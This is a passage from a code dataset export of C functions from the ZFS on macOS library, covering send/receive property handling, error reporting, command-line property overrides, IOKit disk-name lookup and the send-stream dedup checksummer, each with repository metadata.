{\n\t\t\t\ttrunc_prop_errs(intval);\n\t\t\t\tbreak;\n\t\t\t} else if (snapname == NULL || finalsnap == NULL ||\n\t\t\t    strcmp(finalsnap, snapname) == 0 ||\n\t\t\t    strcmp(nvpair_name(prop_err),\n\t\t\t    zfs_prop_to_name(ZFS_PROP_REFQUOTA)) != 0) {\n\t\t\t\t/*\n\t\t\t\t * Skip the special case of, for example,\n\t\t\t\t * \"refquota\", errors on intermediate\n\t\t\t\t * snapshots leading up to a final one.\n\t\t\t\t * That's why we have all of the checks above.\n\t\t\t\t *\n\t\t\t\t * See zfs_ioctl.c's extract_delay_props() for\n\t\t\t\t * a list of props which can fail on\n\t\t\t\t * intermediate snapshots, but shouldn't\n\t\t\t\t * affect the overall receive.\n\t\t\t\t */\n\t\t\t\t(void) snprintf(tbuf, sizeof (tbuf),\n\t\t\t\t    dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"cannot receive %s property on %s\"),\n\t\t\t\t    nvpair_name(prop_err), name);\n\t\t\t\tzfs_setprop_error(hdl, prop, intval, tbuf);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (err == 0 && snapprops_nvlist) {\n\t\tzfs_cmd_t zc = {\"\\0\"};\n\n\t\t(void) strcpy(zc.zc_name, destsnap);\n\t\tzc.zc_cookie = B_TRUE; /* received */\n\t\tif (zcmd_write_src_nvlist(hdl, &zc, snapprops_nvlist) == 0) {\n\t\t\t(void) zfs_ioctl(hdl, ZFS_IOC_SET_PROP, &zc);\n\t\t\tzcmd_free_nvlists(&zc);\n\t\t}\n\t}\n\tif (err == 0 && snapholds_nvlist) {\n\t\tnvpair_t *pair;\n\t\tnvlist_t *holds, *errors = NULL;\n\t\tint cleanup_fd = -1;\n\n\t\tVERIFY(0 == nvlist_alloc(&holds, 0, KM_SLEEP));\n\t\tfor (pair = nvlist_next_nvpair(snapholds_nvlist, NULL);\n\t\t    pair != NULL;\n\t\t    pair = nvlist_next_nvpair(snapholds_nvlist, pair)) {\n\t\t\tVERIFY(0 == nvlist_add_string(holds, destsnap,\n\t\t\t    nvpair_name(pair)));\n\t\t}\n\t\t(void) lzc_hold(holds, cleanup_fd, &errors);\n\t\tnvlist_free(snapholds_nvlist);\n\t\tnvlist_free(holds);\n\t}\n\n\tif (err && (ioctl_errno == ENOENT || ioctl_errno == EEXIST)) {\n\t\t/*\n\t\t * It may be that this snapshot already exists,\n\t\t * in which case we want to consume & ignore it\n\t\t * rather than failing.\n\t\t */\n\t\tavl_tree_t *local_avl;\n\t\tnvlist_t *local_nv, *fs;\n\t\tcp = strchr(destsnap, '@');\n\n\t\t/*\n\t\t * XXX Do this faster by just iterating over snaps in\n\t\t * this fs.  Also if zc_value does not exist, we will\n\t\t * get a strange \"does not exist\" error message.\n\t\t */\n\t\t*cp = '\\0';\n\t\tif (gather_nvlist(hdl, destsnap, NULL, NULL, B_FALSE, B_TRUE,\n\t\t    B_FALSE, B_FALSE, B_FALSE, B_FALSE, B_FALSE, B_TRUE,\n\t\t    &local_nv, &local_avl) == 0) {\n\t\t\t*cp = '@';\n\t\t\tfs = fsavl_find(local_avl, drrb->drr_toguid, NULL);\n\t\t\tfsavl_destroy(local_avl);\n\t\t\tnvlist_free(local_nv);\n\n\t\t\tif (fs != NULL) {\n\t\t\t\tif (flags->verbose) {\n\t\t\t\t\t(void) printf(\"snap %s already exists; \"\n\t\t\t\t\t    \"ignoring\\n\", destsnap);\n\t\t\t\t}\n\t\t\t\terr = ioctl_err = recv_skip(hdl, infd,\n\t\t\t\t    flags->byteswap);\n\t\t\t}\n\t\t}\n\t\t*cp = '@';\n\t}\n\n\tif (ioctl_err != 0) {\n\t\tswitch (ioctl_errno) {\n\t\tcase ENODEV:\n\t\t\tcp = strchr(destsnap, '@');\n\t\t\t*cp = '\\0';\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"most recent snapshot of %s does not\\n\"\n\t\t\t    \"match incremental source\"), destsnap);\n\t\t\t(void) zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\t*cp = '@';\n\t\t\tbreak;\n\t\tcase ETXTBSY:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"destination %s has been modified\\n\"\n\t\t\t    \"since most recent snapshot\"), name);\n\t\t\t(void) zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\tbreak;\n\t\tcase EACCES:\n\t\t\tif (raw && stream_wantsnewfs) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"failed to create encryption key\"));\n\t\t\t} else if (raw && !stream_wantsnewfs) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"encryption key does not match \"\n\t\t\t\t    \"existing key\"));\n\t\t\t} else {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"inherited key must be loaded\"));\n\t\t\t}\n\t\t\t(void) zfs_error(hdl, EZFS_CRYPTOFAILED, errbuf);\n\t\t\tbreak;\n\t\tcase EEXIST:\n\t\t\tcp = strchr(destsnap, '@');\n\t\t\tif (newfs) {\n\t\t\t\t/* it's the containing fs that exists */\n\t\t\t\t*cp = '\\0';\n\t\t\t}\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"destination already exists\"));\n\t\t\t(void) zfs_error_fmt(hdl, EZFS_EXISTS,\n\t\t\t    dgettext(TEXT_DOMAIN, \"cannot restore to %s\"),\n\t\t\t    destsnap);\n\t\t\t*cp = '@';\n\t\t\tbreak;\n\t\tcase EINVAL:\n\t\t\tif (flags->resumable)\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"kernel modules must be upgraded to \"\n\t\t\t\t    \"receive this stream.\"));\n\t\t\tif (embedded && !raw)\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"incompatible embedded data stream \"\n\t\t\t\t    \"feature with encrypted receive.\"));\n\t\t\t(void) zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tbreak;\n\t\tcase ECKSUM:\n\t\t\trecv_ecksum_set_aux(hdl, destsnap, flags->resumable);\n\t\t\t(void) zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tbreak;\n\t\tcase ENOTSUP:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"pool must be upgraded to receive this stream.\"));\n\t\t\t(void) zfs_error(hdl, EZFS_BADVERSION, errbuf);\n\t\t\tbreak;\n\t\tcase EDQUOT:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"destination %s space quota exceeded.\"), name);\n\t\t\t(void) zfs_error(hdl, EZFS_NOSPC, errbuf);\n\t\t\tbreak;\n\t\tcase ZFS_ERR_FROM_IVSET_GUID_MISSING:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"IV set guid missing. See errata %u at \"\n\t\t\t    \"http://zfsonlinux.org/msg/ZFS-8000-ER.\"),\n\t\t\t    ZPOOL_ERRATA_ZOL_8308_ENCRYPTION);\n\t\t\t(void) zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tbreak;\n\t\tcase ZFS_ERR_FROM_IVSET_GUID_MISMATCH:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"IV set guid mismatch. See the 'zfs receive' \"\n\t\t\t    \"man page section\\n discussing the limitations \"\n\t\t\t    \"of raw encrypted send streams.\"));\n\t\t\t(void) zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tbreak;\n\t\tcase ZFS_ERR_SPILL_BLOCK_FLAG_MISSING:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"Spill block flag missing for raw send.\\n\"\n\t\t\t    \"The zfs software on the sending system must \"\n\t\t\t    \"be updated.\"));\n\t\t\t(void) zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tbreak;\n\t\tcase EBUSY:\n\t\t\tif (hastoken) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"destination %s contains \"\n\t\t\t\t    \"partially-complete state from \"\n\t\t\t\t    \"\\\"zfs receive -s\\\".\"), name);\n\t\t\t\t(void) zfs_error(hdl, EZFS_BUSY, errbuf);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t/* fallthru */\n\t\tdefault:\n\t\t\t(void) zfs_standard_error(hdl, ioctl_errno, errbuf);\n\t\t}\n\t}\n\n\t/*\n\t * Mount the target filesystem (if created).  Also mount any\n\t * children of the target filesystem if we did a replication\n\t * receive (indicated by stream_avl being non-NULL).\n\t */\n\tcp = strchr(destsnap, '@');\n\tif (cp && (ioctl_err == 0 || !newfs)) {\n\t\tzfs_handle_t *h;\n\n\t\t*cp = '\\0';\n\t\th = zfs_open(hdl, destsnap,\n\t\t    ZFS_TYPE_FILESYSTEM | ZFS_TYPE_VOLUME);\n\t\tif (h != NULL) {\n\t\t\tif (h->zfs_type == ZFS_TYPE_VOLUME) {\n\t\t\t\t*cp = '@';\n\t\t\t} else if (newfs || stream_avl) {\n\t\t\t\t/*\n\t\t\t\t * Track the first/top of hierarchy fs,\n\t\t\t\t * for mounting and sharing later.\n\t\t\t\t */\n\t\t\t\tif (top_zfs && *top_zfs == NULL)\n\t\t\t\t\t*top_zfs = zfs_strdup(hdl, destsnap);\n\t\t\t}\n\t\t\tzfs_close(h);\n\t\t}\n\t\t*cp = '@';\n\t}\n\n\tif (clp) {\n\t\tif (!flags->nomount)\n\t\t\terr |= changelist_postfix(clp);\n\t\tchangelist_free(clp);\n\t}\n\n\tif (prop_errflags & ZPROP_ERR_NOCLEAR) {\n\t\t(void) fprintf(stderr, dgettext(TEXT_DOMAIN, \"Warning: \"\n\t\t    \"failed to clear unreceived properties on %s\"), name);\n\t\t(void) fprintf(stderr, \"\\n\");\n\t}\n\tif (prop_errflags & ZPROP_ERR_NORESTORE) {\n\t\t(void) fprintf(stderr, dgettext(TEXT_DOMAIN, \"Warning: \"\n\t\t    \"failed to restore original properties on %s\"), name);\n\t\t(void) fprintf(stderr, \"\\n\");\n\t}\n\n\tif (err || ioctl_err) {\n\t\terr = -1;\n\t\tgoto out;\n\t}\n\n\tif (flags->verbose) {\n\t\tchar buf1[64];\n\t\tchar buf2[64];\n\t\tuint64_t bytes = read_bytes;\n\t\ttime_t delta = time(NULL) - begin_time;\n\t\tif (delta == 0)\n\t\t\tdelta = 1;\n\t\tzfs_nicebytes(bytes, buf1, sizeof (buf1));\n\t\tzfs_nicebytes(bytes/delta, buf2, sizeof (buf1));\n\n\t\t(void) printf(\"received %s stream in %lu seconds (%s/sec)\\n\",\n\t\t    buf1, delta, buf2);\n\t}\n\n\terr = 0;\nout:\n\tif (prop_errors != NULL)\n\t\tnvlist_free(prop_errors);\n\n\tif (tmp_keylocation[0] != '\\0') {\n\t\tVERIFY(0 == nvlist_add_string(rcvprops,\n\t\t    zfs_prop_to_name(ZFS_PROP_KEYLOCATION), tmp_keylocation));\n\t}\n\n\tif (newprops)\n\t\tnvlist_free(rcvprops);\n\n\tnvlist_free(oxprops);\n\tnvlist_free(origprops);\n\n\treturn (err);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Returns the grand origin (origin of origin of origin...) of a given handle.\n * If this dataset is not a clone, it simply returns a copy of the original\n * handle.\n */\n", "func_signal": "static zfs_handle_t *\nrecv_open_grand_origin(zfs_handle_t *zhp)", "code": "{\n\tchar origin[ZFS_MAX_DATASET_NAME_LEN];\n\tzprop_source_t src;\n\tzfs_handle_t *ozhp = zfs_handle_dup(zhp);\n\n\twhile (ozhp != NULL) {\n\t\tif (zfs_prop_get(ozhp, ZFS_PROP_ORIGIN, origin,\n\t\t    sizeof (origin), &src, NULL, 0, B_FALSE) != 0)\n\t\t\tbreak;\n\n\t\t(void) zfs_close(ozhp);\n\t\tozhp = zfs_open(zhp->zfs_hdl, origin, ZFS_TYPE_FILESYSTEM);\n\t}\n\n\treturn (ozhp);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Given \"/dev/disk6\" connect to IOkit and fetch the dataset\n * name \"BOOM/lower\", and use it instead.\n */\n", "func_signal": "void expand_disk_to_zfs(char *devname, int len)", "code": "{\n\tchar *result = NULL;\n\tCFMutableDictionaryRef matchingDict;\n\tio_service_t service;\n\tCFStringRef cfstr;\n\tchar *device;\n\n\tif (strncmp(devname, \"/dev/disk\", 9) != 0)\n\t\treturn;\n\n\tdevice = &devname[5];\n\n\tmatchingDict = IOBSDNameMatching(kIOMasterPortDefault, 0, device);\n\tif (NULL == matchingDict)\n\t\treturn;\n\n\t/*\n\t * Fetch the object with the matching BSD node name.\n\t * Note that there should only be one match, so\n\t * IOServiceGetMatchingService is used instead of\n\t * IOServiceGetMatchingServices to simplify the code.\n\t */\n\tservice = IOServiceGetMatchingService(kIOMasterPortDefault,\n\t\t\t\t\t\t\t\t\t\t  matchingDict);\n\n\tif (IO_OBJECT_NULL == service) {\n\t\treturn;\n\t}\n\n\tcfstr = IORegistryEntryCreateCFProperty(service,\n\t\tCFSTR(\"ZFS Dataset\"), kCFAllocatorDefault, 0);\n\tif (cfstr) {\n\t\tresult = MYCFStringCopyUTF8String(cfstr);\n\t\tCFRelease(cfstr);\n\t}\n\n\tIOObjectRelease(service);\n\n\tif (result) {\n\t\tstrlcpy(devname, result, len);\n\t\tfree(result);\n\t}\n}", "path": "zfs/lib/libspl/getmntany.c", "commit_date": "2018-09-28 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Prepare a new nvlist of properties that are to override (-o) or be excluded\n * (-x) from the received dataset\n * recvprops: received properties from the send stream\n * cmdprops: raw input properties from command line\n * origprops: properties, both locally-set and received, currently set on the\n *            target dataset if it exists, NULL otherwise.\n * oxprops: valid output override (-o) and excluded (-x) properties\n */\n", "func_signal": "static int\nzfs_setup_cmdline_props(libzfs_handle_t *hdl, zfs_type_t type,\n    char *fsname, boolean_t zoned, boolean_t recursive, boolean_t newfs,\n    boolean_t raw, boolean_t toplevel, nvlist_t *recvprops, nvlist_t *cmdprops,\n    nvlist_t *origprops, nvlist_t **oxprops, uint8_t **wkeydata_out,\n    uint_t *wkeylen_out, const char *errbuf)", "code": "{\n\tnvpair_t *nvp;\n\tnvlist_t *oprops, *voprops;\n\tzfs_handle_t *zhp = NULL;\n\tzpool_handle_t *zpool_hdl = NULL;\n\tchar *cp;\n\tint ret = 0;\n\tchar namebuf[ZFS_MAX_DATASET_NAME_LEN];\n\n\tif (nvlist_empty(cmdprops))\n\t\treturn (0); /* No properties to override or exclude */\n\n\t*oxprops = fnvlist_alloc();\n\toprops = fnvlist_alloc();\n\n\tstrlcpy(namebuf, fsname, ZFS_MAX_DATASET_NAME_LEN);\n\n\t/*\n\t * Get our dataset handle. The target dataset may not exist yet.\n\t */\n\tif (zfs_dataset_exists(hdl, namebuf, ZFS_TYPE_DATASET)) {\n\t\tzhp = zfs_open(hdl, namebuf, ZFS_TYPE_DATASET);\n\t\tif (zhp == NULL) {\n\t\t\tret = -1;\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\t/* open the zpool handle */\n\tcp = strchr(namebuf, '/');\n\tif (cp != NULL)\n\t\t*cp = '\\0';\n\tzpool_hdl = zpool_open(hdl, namebuf);\n\tif (zpool_hdl == NULL) {\n\t\tret = -1;\n\t\tgoto error;\n\t}\n\n\t/* restore namebuf to match fsname for later use */\n\tif (cp != NULL)\n\t\t*cp = '/';\n\n\t/*\n\t * first iteration: process excluded (-x) properties now and gather\n\t * added (-o) properties to be later processed by zfs_valid_proplist()\n\t */\n\tnvp = NULL;\n\twhile ((nvp = nvlist_next_nvpair(cmdprops, nvp)) != NULL) {\n\t\tconst char *name = nvpair_name(nvp);\n\t\tzfs_prop_t prop = zfs_name_to_prop(name);\n\n\t\t/* \"origin\" is processed separately, don't handle it here */\n\t\tif (prop == ZFS_PROP_ORIGIN)\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * we're trying to override or exclude a property that does not\n\t\t * make sense for this type of dataset, but we don't want to\n\t\t * fail if the receive is recursive: this comes in handy when\n\t\t * the send stream contains, for instance, a child ZVOL and\n\t\t * we're trying to receive it with \"-o atime=on\"\n\t\t */\n\t\tif (!zfs_prop_valid_for_type(prop, type, B_FALSE) &&\n\t\t    !zfs_prop_user(name)) {\n\t\t\tif (recursive)\n\t\t\t\tcontinue;\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"property '%s' does not apply to datasets of this \"\n\t\t\t    \"type\"), name);\n\t\t\tret = zfs_error(hdl, EZFS_BADPROP, errbuf);\n\t\t\tgoto error;\n\t\t}\n\n\t\t/* raw streams can't override encryption properties */\n\t\tif ((zfs_prop_encryption_key_param(prop) ||\n\t\t    prop == ZFS_PROP_ENCRYPTION) && (raw || !newfs)) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"encryption property '%s' cannot \"\n\t\t\t    \"be set or excluded for raw or incremental \"\n\t\t\t    \"streams.\"), name);\n\t\t\tret = zfs_error(hdl, EZFS_BADPROP, errbuf);\n\t\t\tgoto error;\n\t\t}\n\n\t\tswitch (nvpair_type(nvp)) {\n\t\tcase DATA_TYPE_BOOLEAN: /* -x property */\n\t\t\t/*\n\t\t\t * DATA_TYPE_BOOLEAN is the way we're asked to \"exclude\"\n\t\t\t * a property: this is done by forcing an explicit\n\t\t\t * inherit on the destination so the effective value is\n\t\t\t * not the one we received from the send stream.\n\t\t\t * We do this only if the property is not already\n\t\t\t * locally-set, in which case its value will take\n\t\t\t * priority over the received anyway.\n\t\t\t */\n\t\t\tif (nvlist_exists(origprops, name)) {\n\t\t\t\tnvlist_t *attrs;\n\n\t\t\t\tattrs = fnvlist_lookup_nvlist(origprops, name);\n\t\t\t\tif (strcmp(fnvlist_lookup_string(attrs,\n\t\t\t\t    ZPROP_SOURCE), ZPROP_SOURCE_VAL_RECVD) != 0)\n\t\t\t\t\tcontinue;\n\t\t\t}\n\t\t\t/*\n\t\t\t * We can't force an explicit inherit on non-inheritable\n\t\t\t * properties: if we're asked to exclude this kind of\n\t\t\t * values we remove them from \"recvprops\" input nvlist.\n\t\t\t */\n\t\t\tif (!zfs_prop_inheritable(prop) &&\n\t\t\t    !zfs_prop_user(name) && /* can be inherited too */\n\t\t\t    nvlist_exists(recvprops, name))\n\t\t\t\tfnvlist_remove(recvprops, name);\n\t\t\telse\n\t\t\t\tfnvlist_add_nvpair(*oxprops, nvp);\n\t\t\tbreak;\n\t\tcase DATA_TYPE_STRING: /* -o property=value */\n\t\t\tfnvlist_add_nvpair(oprops, nvp);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"property '%s' must be a string or boolean\"), name);\n\t\t\tret = zfs_error(hdl, EZFS_BADPROP, errbuf);\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\tif (toplevel) {\n\t\t/* convert override strings properties to native */\n\t\tif ((voprops = zfs_valid_proplist(hdl, ZFS_TYPE_DATASET,\n\t\t    oprops, zoned, zhp, zpool_hdl, B_FALSE, errbuf)) == NULL) {\n\t\t\tret = zfs_error(hdl, EZFS_BADPROP, errbuf);\n\t\t\tgoto error;\n\t\t}\n\n\t\t/*\n\t\t * zfs_crypto_create() requires the parent name. Get it\n\t\t * by truncating the fsname copy stored in namebuf.\n\t\t */\n\t\tcp = strrchr(namebuf, '/');\n\t\tif (cp != NULL)\n\t\t\t*cp = '\\0';\n\n\t\tif (!raw && zfs_crypto_create(hdl, namebuf, voprops, NULL,\n\t\t    B_FALSE, wkeydata_out, wkeylen_out) != 0) {\n\t\t\tfnvlist_free(voprops);\n\t\t\tret = zfs_error(hdl, EZFS_CRYPTOFAILED, errbuf);\n\t\t\tgoto error;\n\t\t}\n\n\t\t/* second pass: process \"-o\" properties */\n\t\tfnvlist_merge(*oxprops, voprops);\n\t\tfnvlist_free(voprops);\n\t} else {\n\t\t/* override props on child dataset are inherited */\n\t\tnvp = NULL;\n\t\twhile ((nvp = nvlist_next_nvpair(oprops, nvp)) != NULL) {\n\t\t\tconst char *name = nvpair_name(nvp);\n\t\t\tfnvlist_add_boolean(*oxprops, name);\n\t\t}\n\t}\n\nerror:\n\tif (zhp != NULL)\n\t\tzfs_close(zhp);\n\tif (zpool_hdl != NULL)\n\t\tzpool_close(zpool_hdl);\n\tfnvlist_free(oprops);\n\treturn (ret);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * This function is started in a separate thread when the dedup option\n * has been requested.  The main send thread determines the list of\n * snapshots to be included in the send stream and makes the ioctl calls\n * for each one.  But instead of having the ioctl send the output to the\n * the output fd specified by the caller of zfs_send()), the\n * ioctl is told to direct the output to a pipe, which is read by the\n * alternate thread running THIS function.  This function does the\n * dedup'ing by:\n *  1. building a dedup table (the DDT)\n *  2. doing checksums on each data block and inserting a record in the DDT\n *  3. looking for matching checksums, and\n *  4.  sending a DRR_WRITE_BYREF record instead of a write record whenever\n *      a duplicate block is found.\n * The output of this function then goes to the output fd requested\n * by the caller of zfs_send().\n */\n", "func_signal": "static void *\ncksummer(void *arg)", "code": "{\n\tdedup_arg_t *dda = arg;\n\tchar *buf = zfs_alloc(dda->dedup_hdl, SPA_MAXBLOCKSIZE);\n\tdmu_replay_record_t thedrr;\n\tdmu_replay_record_t *drr = &thedrr;\n\tFILE *ofp;\n\tint outfd;\n\tdedup_table_t ddt;\n\tzio_cksum_t stream_cksum;\n    size_t len;\n\tuint64_t physmem = 0;\n\tuint64_t numbuckets;\n\n    len = sizeof(physmem);\n    sysctlbyname(\"hw.memsize\", &physmem, &len, NULL, 0);\n\n\tddt.max_ddt_size =\n\t    MAX((physmem * MAX_DDT_PHYSMEM_PERCENT)/100,\n\t    SMALLEST_POSSIBLE_MAX_DDT_MB<<20);\n\n\tnumbuckets = ddt.max_ddt_size/(sizeof (dedup_entry_t));\n\n\t/*\n\t * numbuckets must be a power of 2.  Increase number to\n\t * a power of 2 if necessary.\n\t */\n\tif (!ISP2(numbuckets))\n\t\tnumbuckets = 1ULL << high_order_bit(numbuckets);\n\n\tddt.dedup_hash_array = calloc(numbuckets, sizeof (dedup_entry_t *));\n\tddt.ddecache = umem_cache_create(\"dde\", sizeof (dedup_entry_t), 0,\n\t    NULL, NULL, NULL, NULL, NULL, 0);\n\tddt.cur_ddt_size = numbuckets * sizeof (dedup_entry_t *);\n\tddt.numhashbits = high_order_bit(numbuckets) - 1;\n\tddt.ddt_full = B_FALSE;\n\n\toutfd = dda->outputfd;\n\tofp = fdopen(dda->inputfd, \"r\");\n\twhile (ssread(drr, sizeof (*drr), ofp) != 0) {\n\n\t\t/*\n\t\t * kernel filled in checksum, we are going to write same\n\t\t * record, but need to regenerate checksum.\n\t\t */\n\t\tif (drr->drr_type != DRR_BEGIN) {\n\t\t\tbzero(&drr->drr_u.drr_checksum.drr_checksum,\n\t\t\t    sizeof (drr->drr_u.drr_checksum.drr_checksum));\n\t\t}\n\n\t\tswitch (drr->drr_type) {\n\t\tcase DRR_BEGIN:\n\t\t{\n\t\t\tstruct drr_begin *drrb = &drr->drr_u.drr_begin;\n\t\t\tint fflags;\n\t\t\tint sz = 0;\n\t\t\tZIO_SET_CHECKSUM(&stream_cksum, 0, 0, 0, 0);\n\n\t\t\tASSERT3U(drrb->drr_magic, ==, DMU_BACKUP_MAGIC);\n\n\t\t\t/* set the DEDUP feature flag for this stream */\n\t\t\tfflags = DMU_GET_FEATUREFLAGS(drrb->drr_versioninfo);\n\t\t\tfflags |= (DMU_BACKUP_FEATURE_DEDUP |\n\t\t\t    DMU_BACKUP_FEATURE_DEDUPPROPS);\n\t\t\tDMU_SET_FEATUREFLAGS(drrb->drr_versioninfo, fflags);\n\n\t\t\tif (drr->drr_payloadlen != 0) {\n\t\t\t\tsz = drr->drr_payloadlen;\n\n\t\t\t\tif (sz > SPA_MAXBLOCKSIZE) {\n\t\t\t\t\tbuf = zfs_realloc(dda->dedup_hdl, buf,\n\t\t\t\t\t    SPA_MAXBLOCKSIZE, sz);\n\t\t\t\t}\n\t\t\t\t(void) ssread(buf, sz, ofp);\n\t\t\t\tif (ferror(stdin))\n\t\t\t\t\tperror(\"fread\");\n\t\t\t}\n\t\t\tif (dump_record(drr, buf, sz, &stream_cksum,\n\t\t\t    outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_END:\n\t\t{\n\t\t\tstruct drr_end *drre = &drr->drr_u.drr_end;\n\t\t\t/* use the recalculated checksum */\n\t\t\tdrre->drr_checksum = stream_cksum;\n\t\t\tif (dump_record(drr, NULL, 0, &stream_cksum,\n\t\t\t    outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_OBJECT:\n\t\t{\n\t\t\tstruct drr_object *drro = &drr->drr_u.drr_object;\n\t\t\tif (drro->drr_bonuslen > 0) {\n\t\t\t\t(void) ssread(buf,\n\t\t\t\t    DRR_OBJECT_PAYLOAD_SIZE(drro), ofp);\n\t\t\t}\n\t\t\tif (dump_record(drr, buf, DRR_OBJECT_PAYLOAD_SIZE(drro),\n\t\t\t    &stream_cksum, outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_SPILL:\n\t\t{\n\t\t\tstruct drr_spill *drrs = &drr->drr_u.drr_spill;\n\t\t\t(void) ssread(buf, DRR_SPILL_PAYLOAD_SIZE(drrs), ofp);\n\t\t\tif (dump_record(drr, buf, DRR_SPILL_PAYLOAD_SIZE(drrs),\n\t\t\t    &stream_cksum, outfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_FREEOBJECTS:\n\t\t{\n\t\t\tif (dump_record(drr, NULL, 0, &stream_cksum,\n\t\t\t\t\t\t\toutfd) != 0)\n\t\t\t\tgoto out;\n\t\t\tbreak;\n\t\t}\n\n\t\tcase DRR_WRITE:\n\t\t{\n \t\t\tstruct drr_write *drrw = &drr->drr_u.drr_write;\n\t\t\tdataref_t\tdataref;\n\t\t\tuint64_t\tpayload_size;\n\n\t\t\tpayload_size = DRR_WRITE_PAYLOAD_SIZE(drrw);\n\t\t\t(void) ssread(buf, payload_size, ofp);\n\n\t\t\t/*\n\t\t\t * Use the existing checksum if it's dedup-capable,\n\t\t\t * else calculate a SHA256 checksum for it.\n\t\t\t */\n\n\t\t\tif (ZIO_CHECKSUM_EQUAL(drrw->drr_key.ddk_cksum,\n\t\t\t    zero_cksum) ||\n\t\t\t    !DRR_IS_DEDUP_CAPABLE(drrw->drr_flags)) {\n\t\t\t\tSHA256_CTX\tctx;\n\t\t\t\tzio_cksum_t tmpsha256;\n\n\t\t\t\tSHA256Init(&ctx);\n\t\t\t\tSHA256Update(&ctx, buf, payload_size);\n\t\t\t\tSHA256Final(&tmpsha256, &ctx);\n\n\t\t\t\tdrrw->drr_key.ddk_cksum.zc_word[0] =\n\t\t\t\t    BE_64(tmpsha256.zc_word[0]);\n\t\t\t\tdrrw->drr_key.ddk_cksum.zc_word[1] =\n\t\t\t\t    BE_64(tmpsha256.zc_word[1]);\n\t\t\t\tdrrw->drr_key.ddk_cksum.zc_word[2] =\n\t\t\t\t    BE_64(tmpsha256.zc_word[2]);\n\t\t\t\tdrrw->drr_key.ddk_cksum.zc_word[3] =\n\t\t\t\t    BE_64(tmpsha256.zc_word[3]);\n\t\t\t\tdrrw->drr_checksumtype = ZIO_CHECKSUM_SHA256;\n\t\t\t\tdrrw->drr_flags |= DRR_CHECKSUM_DEDUP;\n\t\t\t}\n\n\t\t\tdataref.ref_guid = drrw->drr_toguid;\n\t\t\tdataref.ref_object = drrw->drr_object;\n\t\t\tdataref.ref_offset = drrw->drr_offset;\n\n\t\t\tif (ddt_update(dda->dedup_hdl, &ddt,\n\t\t\t    &drrw->drr_key.ddk_cksum, drrw->drr_key.ddk_prop,\n\t\t\t    &dataref)) {\n\t\t\t\tdmu_replay_record_t wbr_drr = {0};\n\t\t\t\tstruct drr_write_byref *wbr_drrr =\n\t\t\t\t    &wbr_drr.drr_u.drr_write_byref;\n\n\t\t\t\t/* block already present in stream */\n\t\t\t\twbr_drr.drr_type = DRR_WRITE_BYREF;\n\n\t\t\t\twbr_drrr->drr_object = drrw->drr_object;\n\t\t\t\twbr_drrr->drr_offset = drrw->drr_offset;\n\t\t\t\twbr_drrr->drr_length = drrw->drr_logical_size;\n\t\t\t\twbr_drrr->drr_toguid = drrw->drr_toguid;\n\t\t\t\twbr_drrr->drr_refguid = dataref.ref_guid;\n\t\t\t\twbr_drrr->drr_refobject =\n\t\t\t\t    dataref.ref_object;\n\t\t\t\twbr_drrr->drr_refoffset =\n\t\t\t\t    